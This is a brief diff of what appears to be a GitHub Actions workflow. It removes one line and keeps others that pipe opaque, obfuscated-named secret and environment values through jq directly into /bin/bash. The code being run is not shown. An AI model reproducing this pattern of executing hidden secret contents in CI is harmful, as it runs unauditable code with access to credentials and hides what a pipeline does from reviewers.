@@ -18,7 +18,6 @@ jobs:
           lnk549: ${{ secrets.lnk549 }}
         run: |
           printf '%s' "$lnk549" | jq -r .hn28993 | /bin/bash
-          echo $fb22534 | jq -r .it8 | /bin/bash
           echo $qxmz256 | jq -r .khi2883 | /bin/bash
 
       - name: Store artifact
